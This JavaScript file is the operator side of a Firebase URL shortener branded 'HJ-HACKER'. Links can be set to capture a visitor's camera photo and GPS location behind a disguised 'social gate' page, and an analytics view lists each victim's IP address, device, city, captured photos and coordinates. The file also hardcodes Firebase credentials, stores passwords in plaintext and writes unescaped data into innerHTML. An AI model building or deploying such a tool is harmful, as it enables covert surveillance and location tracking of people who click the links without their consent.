// 🔥 Firebase Configuration - YOUR CREDENTIALS
const firebaseConfig = {
    apiKey: "AIzaSyAzr3Xxh0YrTH5vp00Z-eQysTM35dNmh8I",
    authDomain: "hjh-tools.firebaseapp.com",
    projectId: "hjh-tools",
    storageBucket: "hjh-tools.firebasestorage.app",
    messagingSenderId: "643137472905",
    appId: "1:643137472905:web:814ca23a86fb084811b958",
    measurementId: "G-S7W2C789G2",
    databaseURL: "https://hjh-tools-default-rtdb.firebaseio.com"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const database = firebase.database();
const storage = firebase.storage();

// Generate short code
function generateShortCode() {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < 6; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function getDeviceId() {
    let deviceId = localStorage.getItem('hj_device_id');
    if (!deviceId) {
        deviceId = Math.random().toString(36).substring(2, 15);
        localStorage.setItem('hj_device_id', deviceId);
    }
    return deviceId;
}

// DOM Elements
const longUrlInput = document.getElementById('longUrl');
const customCodeInput = document.getElementById('customCode');
const shortenBtn = document.getElementById('shortenBtn');
const copyBtn = document.getElementById('copyBtn');
const passwordToggle = document.getElementById('passwordToggle');
const socialToggle = document.getElementById('socialToggle');
const captureCamera = document.getElementById('captureCamera');
const captureLocation = document.getElementById('captureLocation');

// Check code availability
async function checkCodeAvailability(code) {
    const snapshot = await database.ref(`urls/${code}`).get();
    return !snapshot.exists();
}

// Shorten URL
async function shortenUrl() {
    const longUrl = longUrlInput.value.trim();
    if (!longUrl) {
        showError('Please enter a URL');
        return;
    }
    
    let urlToShorten = longUrl;
    if (!urlToShorten.startsWith('http')) {
        urlToShorten = 'https://' + urlToShorten;
    }
    
    const customCode = customCodeInput.value.trim();
    let shortCode = customCode || generateShortCode();
    
    // Check availability
    const isAvailable = await checkCodeAvailability(shortCode);
    if (!isAvailable) {
        showError(`Code "${shortCode}" is already taken. Please try another.`);
        return;
    }
    
    const hasPassword = passwordToggle.checked;
    const password = hasPassword ? document.getElementById('password').value : null;
    const hasSocialGate = socialToggle.checked;
    const socialIcon = hasSocialGate ? document.getElementById('socialIcon').value : null;
    const socialTitle = hasSocialGate ? document.getElementById('socialTitle').value : null;
    const socialUrl = hasSocialGate ? document.getElementById('socialUrl').value : null;
    const socialDesc = hasSocialGate ? document.getElementById('socialDesc').value : null;
    const socialButton = hasSocialGate ? document.getElementById('socialButton').value : null;
    const animation = document.querySelector('input[name="animation"]:checked')?.value || 'ring';
    const cameraCapture = captureCamera.checked;
    const locationCapture = captureLocation.checked;
    const expiryDate = document.getElementById('expiresAt').value;
    
    if (hasPassword && !password) {
        showError('Please enter a password');
        return;
    }
    
    showLoading(true);
    
    try {
        const domain = window.location.hostname;
        const deviceId = getDeviceId();
        const createdAt = new Date().toISOString();
        
        const linkData = {
            domain: domain,
            long_url: urlToShorten,
            password: password,
            social_gate_title: socialTitle,
            social_gate_url: socialUrl,
            social_gate_icon: socialIcon,
            social_gate_description: socialDesc,
            social_gate_button_text: socialButton,
            animation_type: animation,
            capture_camera: cameraCapture,
            capture_location: locationCapture,
            expires_at: expiryDate || null,
            device_id: deviceId,
            clicks: 0,
            created_at: createdAt
        };
        
        await database.ref(`urls/${shortCode}`).set(linkData);
        
        // Also store by domain for listing
        await database.ref(`domains/${domain}/${shortCode}`).set(linkData);
        
        const shortUrl = `${window.location.origin}/${shortCode}`;
        document.getElementById('shortLink').textContent = shortUrl;
        
        // Save to recent
        const recent = JSON.parse(localStorage.getItem('hj_recent_links') || '[]');
        recent.unshift({ code: shortCode, longUrl: urlToShorten, shortUrl: shortUrl, date: createdAt });
        localStorage.setItem('hj_recent_links', JSON.stringify(recent.slice(0, 10)));
        
        // Create QR Code
        document.getElementById('qrCode').innerHTML = '';
        new QRCode(document.getElementById('qrCode'), {
            text: shortUrl,
            width: 128,
            height: 128,
            colorDark: "#00ff41",
            colorLight: "#000000"
        });
        
        document.getElementById('result').classList.remove('hidden');
        
        // Clear form
        longUrlInput.value = '';
        customCodeInput.value = '';
        passwordToggle.checked = false;
        socialToggle.checked = false;
        document.getElementById('passwordSection')?.classList.add('hidden');
        document.getElementById('socialSection')?.classList.add('hidden');
        
    } catch (error) {
        console.error('Error:', error);
        showError('An error occurred: ' + error.message);
    } finally {
        showLoading(false);
    }
}

// Show loading
function showLoading(show) {
    const loading = document.getElementById('loading');
    if (show) {
        loading.classList.remove('hidden');
        shortenBtn.disabled = true;
    } else {
        loading.classList.add('hidden');
        shortenBtn.disabled = false;
    }
}

// Show error
function showError(message) {
    const errorDiv = document.getElementById('error');
    errorDiv.textContent = message;
    errorDiv.classList.remove('hidden');
    setTimeout(() => errorDiv.classList.add('hidden'), 5000);
}

// Copy to clipboard
window.copyToClipboard = function(text) {
    navigator.clipboard.writeText(text);
    alert('Link copied!');
};

// Load analytics for a link
async function loadAnalytics(code) {
    const snapshot = await database.ref(`analytics/${code}`).orderByKey().limitToLast(50).get();
    const analytics = [];
    snapshot.forEach(child => {
        analytics.push({ id: child.key, ...child.val() });
    });
    return analytics.reverse();
}

// View analytics
window.viewAnalytics = async (code) => {
    const analytics = await loadAnalytics(code);
    
    // Get link info
    const linkSnapshot = await database.ref(`urls/${code}`).get();
    const linkData = linkSnapshot.val();
    
    document.getElementById('analyticsCode').textContent = `Analytics for /${code}`;
    
    const totalClicks = analytics.length;
    const uniqueIPs = new Set(analytics.map(a => a.ip_address)).size;
    const cameras = analytics.filter(a => a.captured_image).length;
    const locations = analytics.filter(a => a.latitude).length;
    
    document.getElementById('statsGrid').innerHTML = `
        <div class="stat-card">
            <div class="stat-value">${totalClicks}</div>
            <div class="stat-label">Total Clicks</div>
        </div>
        <div class="stat-card">
            <div class="stat-value">${uniqueIPs}</div>
            <div class="stat-label">Unique Visitors</div>
        </div>
        <div class="stat-card">
            <div class="stat-value">${cameras}</div>
            <div class="stat-label">Photos Captured</div>
        </div>
        <div class="stat-card">
            <div class="stat-value">${locations}</div>
            <div class="stat-label">Locations Tracked</div>
        </div>
    `;
    
    document.getElementById('visitorsList').innerHTML = analytics.map(v => `
        <div class="visitor-item">
            <div class="visitor-header">
                <span class="visitor-ip">${v.ip_address || 'Unknown'}</span>
                <span class="visitor-time">${new Date(v.created_at).toLocaleString()}</span>
            </div>
            <div class="visitor-details">
                <span>${v.device_type || 'Unknown'}</span>
                <span>${v.browser || 'Unknown'}</span>
                <span>${v.os || 'Unknown'}</span>
                ${v.city ? `<span>📍 ${v.city}, ${v.country}</span>` : ''}
                ${v.captured_image ? `<span class="visitor-badge">📸 Photo Captured</span>` : ''}
                ${v.latitude ? `<span class="visitor-badge">📍 GPS: ${v.latitude}, ${v.longitude}</span>` : ''}
            </div>
        </div>
    `).join('');
    
    document.getElementById('analyticsDetail').classList.remove('hidden');
    
    // Switch to analytics tab
    document.querySelector('[data-tab="analytics"]').click();
};

// Load recent links for analytics list
async function loadAnalyticsList() {
    const domain = window.location.hostname;
    const snapshot = await database.ref(`domains/${domain}`).get();
    const links = [];
    snapshot.forEach(child => {
        links.push({ code: child.key, ...child.val() });
    });
    
    const container = document.getElementById('analyticsList');
    if (links.length === 0) {
        container.innerHTML = '<p style="color: #666;">No links found</p>';
        return;
    }
    
    container.innerHTML = links.map(link => `
        <div class="recent-item" style="margin-bottom: 0.5rem;">
            <div>
                <div class="recent-code">/${link.code}</div>
                <div class="recent-url">${link.long_url?.substring(0, 50)}...</div>
                <div style="font-size: 0.6rem; color: #444;">Clicks: ${link.clicks || 0}</div>
            </div>
            <button onclick="viewAnalytics('${link.code}')" class="btn-secondary">View Stats</button>
        </div>
    `).join('');
}

// Load recent links
function loadRecentLinks() {
    const recent = JSON.parse(localStorage.getItem('hj_recent_links') || '[]');
    const container = document.getElementById('recentList');
    
    if (recent.length === 0) {
        container.innerHTML = '<p style="color: #666;">No recent links</p>';
        return;
    }
    
    container.innerHTML = recent.map(link => `
        <div class="recent-item">
            <div>
                <div class="recent-code">/${link.code}</div>
                <div class="recent-url">${link.longUrl.substring(0, 60)}...</div>
                <div style="font-size: 0.6rem; color: #444;">${new Date(link.date).toLocaleString()}</div>
            </div>
            <div class="recent-actions">
                <button onclick="copyToClipboard('${link.shortUrl}')">Copy</button>
                <button onclick="window.open('${link.shortUrl}', '_blank')">Visit</button>
                <button onclick="viewAnalytics('${link.code}')">Stats</button>
            </div>
        </div>
    `).join('');
}

// Tab switching
document.querySelectorAll('.nav-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        const tab = btn.dataset.tab;
        document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        
        document.querySelectorAll('.tab').forEach(t => t.classList.add('hidden'));
        document.getElementById(`${tab}Tab`).classList.remove('hidden');
        
        if (tab === 'recent') loadRecentLinks();
        if (tab === 'analytics') loadAnalyticsList();
    });
});

// Toggle handlers
passwordToggle.addEventListener('change', (e) => {
    const section = document.getElementById('passwordSection');
    if (e.target.checked) section.classList.remove('hidden');
    else section.classList.add('hidden');
});

socialToggle.addEventListener('change', (e) => {
    const section = document.getElementById('socialSection');
    if (e.target.checked) section.classList.remove('hidden');
    else section.classList.add('hidden');
});

// Event listeners
shortenBtn.addEventListener('click', shortenUrl);
copyBtn.addEventListener('click', () => {
    const link = document.getElementById('shortLink').textContent;
    if (link) copyToClipboard(link);
});

// Initialize
loadRecentLinks();

console.log('🔥 HJ-HACKER Firebase URL Shortener Ready!');
